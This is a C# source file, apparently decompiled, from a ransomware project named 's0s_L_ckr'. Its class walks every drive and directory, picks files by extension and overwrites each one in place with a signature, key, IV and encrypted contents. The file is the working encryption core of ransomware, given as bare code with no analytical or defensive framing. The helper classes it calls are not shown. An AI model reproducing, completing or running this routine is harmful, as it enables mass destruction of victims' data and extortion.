using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace s0s_L_ckr;

public sealed class EncrStr
{
	[MethodImpl(MethodImplOptions.AggressiveInlining)]
	public void EncrDis()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo drive in array)
		{
			EncrDrv(drive);
		}
	}

	private void EncrDrv(DriveInfo drive)
	{
		if (drive.IsReady)
		{
			DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();
			try
			{
				DirectoryInfo[] array = directories;
				foreach (DirectoryInfo directoryInfo in array)
				{
					EncrDir(directoryInfo);
				}
				return;
			}
			catch (Exception ex)
			{
				Console.WriteLine("Woopsie", ex.ToString());
				return;
			}
		}
		Console.WriteLine("Error in Drive state " + drive.Name);
	}

	private void EncrDir(DirectoryInfo directoryInfo)
	{
		if (!Comn.DireInFil(directoryInfo.FullName))
		{
			Console.WriteLine("Error in " + directoryInfo.FullName);
			return;
		}
		try
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			if (directories != null)
			{
				DirectoryInfo[] array = directories;
				foreach (DirectoryInfo directoryInfo2 in array)
				{
					EncrDir(directoryInfo2);
				}
			}
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array2 = files;
			foreach (FileInfo file in array2)
			{
				EncrFil(file);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("[!] Error while in " + directoryInfo.Name);
			Console.WriteLine(ex.ToString());
		}
	}

	private void EncrFil(FileInfo file)
	{
		Thread.Sleep(10);
		if (!Comn.FileInFil(file.Extension))
		{
			return;
		}
		Console.WriteLine("Encrypting " + file.FullName);
		Comn.CheckSig(file);
		byte[] fileDat = null;
		FileMgr.ReadFil(file, ref fileDat);
		try
		{
			using FileStream fileStream = File.OpenWrite(file.FullName);
			fileStream.Position = 0L;
			fileStream.Write(ConfigMgr.FILE_SIGN, 0, ConfigMgr.FILE_SIGN_SIZE);
			fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_KEY, 0, CriptoKeyMgr.CURR_FIL_ENC_KEY.Length);
			fileStream.Write(CriptoKeyMgr.CURR_FIL_ENC_IV, 0, CriptoKeyMgr.CURR_FIL_ENC_IV.Length);
			fileStream.Flush();
			CriptoFilMgr.Encrypt(fileStream, ref fileDat);
		}
		catch (UnauthorizedAccessException)
		{
		}
	}
}
